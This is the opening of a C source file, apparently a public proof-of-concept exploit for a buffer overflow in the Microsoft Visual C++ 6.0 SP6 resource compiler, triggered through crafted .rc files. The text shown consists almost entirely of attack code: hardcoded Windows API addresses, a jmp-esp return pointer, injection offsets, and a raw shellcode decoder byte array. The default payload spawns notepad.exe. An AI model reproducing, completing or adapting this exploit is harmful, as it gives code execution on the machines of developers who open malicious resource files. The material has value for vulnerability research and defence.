//*****************
//
//  Microsoft Visual C++ 6.0 SP6 resource compiler buffer overflow 
//  vulnerability .rc resource files exploit 
//
//  vulnerability found / exploit built by porkythepig
//
//*****************

#include "stdio.h"
#include "stdlib.h"
#include "memory.h"

#define STR01 "Microsoft Visual Studio 6.0 SP6 .rc PoC exploit by porkythepig"
#define DEF_SPAWNED_PROCESS "notepad.exe"
#define EXPL_SIZE 283
#define DEC_CODE 0xBC
#define DEC_CODE_OFFSET 0x2D
#define ENC_SIZE_OFFSET 0x3E
#define SHIFT 0x40
#define SHIFT_DEC_OFFSET 0x35
#define PROC_NAME_OFFSET 0x107
#define GETSTAR_OFFSET 0x11
#define CREPRO_OFFSET 0x6d
#define GETWINDIR_OFFSET 0x25
#define ESPSUB_OFFSET 0x08
#define FNAMSHIFT_OFFSET 0x02

typedef struct
{
	unsigned int getStarInf;
	unsigned int crePro;
	unsigned int getWinDir;
	unsigned int jmpEspPtr;
}ApiPtrs;

ApiPtrs osApiPtrs[2]=
{
	0x7c4f49df,0x7c4fc0a0,0x7c4e9c00,0x782f28f7,
	0x7c596b7a,0x7c595010,0x7c592d23,0x77e16280
};

unsigned char decoder[]=
{
	0xeb,0x2a,0xeb,0x2a,0x8b,0xdc,0x81,0xc3,
	0x40,0xff,0xff,0xff,0x8b,0xcb,0x33,0xd2,
	0x8a,0x21,0x80,0xfc,0xbc,0x75,0xe9,0x41,
	0x8a,0x21,0x80,0xec,0x40,0x88,0x23,0x43,
	0x41,0x42,0x33,0xc0,0xb0,0x99,0x3b,0xd0,
	0x7c,0xe6,0xeb,0xd6,0xeb,0xef
};